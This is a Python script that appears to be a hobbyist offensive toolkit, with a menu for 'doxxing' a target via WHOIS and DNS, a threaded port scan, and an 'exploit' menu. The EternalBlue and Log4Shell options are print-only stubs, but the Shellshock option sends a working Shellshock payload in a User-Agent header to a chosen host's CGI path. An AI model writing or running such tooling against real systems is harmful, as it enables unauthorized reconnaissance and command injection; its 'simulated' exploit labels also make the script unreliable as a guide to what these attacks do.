
import socket
import whois
import requests
import threading
import asyncio
import time
from colorama import Fore, Style, init

init(autoreset=True)

def banner():
    print(Fore.BLUE + Style.BRIGHT + r"""
  _________________      _____   ____ ___.____  ___________.______________________   ________  .____     
 /   _____/\_____  \    /     \ |    |   \    | \__    ___/|   \__    ___/\_____  \  \_____  \ |    |    
 \_____  \  /  ____/   /  \ /  \|    |   /    |   |    |   |   | |    |    /   |   \  /   |   \|    |    
 /        \/       \  /    Y    \    |  /|    |___|    |   |   | |    |   /    |    \/    |    \    |___ 
/_______  /\_______ \ \____|__  /______/ |_______ \____|   |___| |____|   \_______  /\_______  /_______ \
        \/         \/         \/                 \/                               \/         \/        \/  
    """)

async def whois_lookup(target):
    try:
        w = whois.whois(target)
        print(Fore.GREEN + str(w))
    except Exception as e:
        print(Fore.RED + f"[-] WHOIS lookup failed: {e}")

async def dns_lookup(target):
    try:
        records = socket.gethostbyname_ex(target)
        print(Fore.GREEN + f"Host: {records[0]}")
        print(Fore.GREEN + f"Aliases: {records[1]}")
        print(Fore.GREEN + f"IP Addresses: {records[2]}")
    except Exception as e:
        print(Fore.RED + f"[-] DNS lookup failed: {e}")

def doxx_target():
    target = input(Fore.CYAN + "[*] Enter target domain or IP: ")
    print(Fore.BLUE + f"\n[+] WHOIS Information for {target}:")
    asyncio.run(whois_lookup(target))
    
    print(Fore.BLUE + "\n[+] DNS Records:")
    asyncio.run(dns_lookup(target))

def scan_port(target, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((target, port))
        if result == 0:
            print(Fore.GREEN + f"[+] Port {port} is OPEN")
        sock.close()
    except Exception as e:
        print(Fore.RED + f"[-] Error scanning port {port}: {e}")

def scan_target():
    target = input(Fore.CYAN + "[*] Enter target IP: ")
    ports = [21, 22, 23, 25, 53, 80, 110, 139, 143, 443, 445, 3389]
    print(Fore.BLUE + f"\n[+] Scanning common ports on {target}...")

    threads = []
    for port in ports:
        thread = threading.Thread(target=scan_port, args=(target, port))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

def exploit_eternalblue(target_ip):
    print(Fore.CYAN + f"[*] (Simulated) Attacking {target_ip} using EternalBlue SMB exploit...")
    time.sleep(1)
    print(Fore.GREEN + "[!] EternalBlue simulated attack complete.")

def exploit_shellshock(target_ip):
    print(Fore.CYAN + f"[*] (Simulated) Attacking {target_ip} using Shellshock exploit...")
    payload = "() { :; }; echo; echo; /bin/bash -c 'echo Vulnerable'"
    try:
        headers = {'User-Agent': payload}
        r = requests.get(f"http://{target_ip}/cgi-bin/test.cgi", headers=headers, timeout=5)
        if "Vulnerable" in r.text:
            print(Fore.GREEN + "[+] Target is vulnerable to Shellshock!")
        else:
            print(Fore.RED + "[-] Target does not appear vulnerable.")
    except Exception as e:
        print(Fore.RED + f"[-] Request failed: {e}")

def exploit_log4shell(target_ip):
    print(Fore.CYAN + f"[*] (Simulated) Checking {target_ip} for Log4Shell vulnerability...")
    time.sleep(1)
    print(Fore.GREEN + "[!] Log4Shell simulated vulnerability check complete.")

def exploit_target():
    target = input(Fore.CYAN + "[*] Enter target IP: ")

    print(Fore.BLUE + "\n--- Exploit Menu ---")
    print(Fore.GREEN + "1. EternalBlue (SMBv1 Windows)")
    print(Fore.GREEN + "2. Shellshock (old Bash versions)")
    print(Fore.GREEN + "3. Log4Shell (Apache servers)")
    choice = input(Fore.CYAN + "Select exploit: ")

    if choice == "1":
        exploit_eternalblue(target)
    elif choice == "2":
        exploit_shellshock(target)
    elif choice == "3":
        exploit_log4shell(target)
    else:
        print(Fore.RED + "[-] Invalid choice. Please select a valid option.")

def main():
    banner()
    while True:
        print(Fore.BLUE + "\n--- Main Menu ---")
        print(Fore.GREEN + "1. Doxx Target")
        print(Fore.GREEN + "2. Scan Target")
        print(Fore.GREEN + "3. Exploit Target")
        print(Fore.GREEN + "4. Exit")

        choice = input(Fore.CYAN + "Select option: ")

        if choice == "1":
            doxx_target()
        elif choice == "2":
            scan_target()
        elif choice == "3":
            exploit_target()
        elif choice == "4":
            print(Fore.CYAN + "Exiting... Stay stealthy.")
            break
        else:
            print(Fore.RED + "[-] Invalid option. Please try again.")

if __name__ == "__main__":
    main()
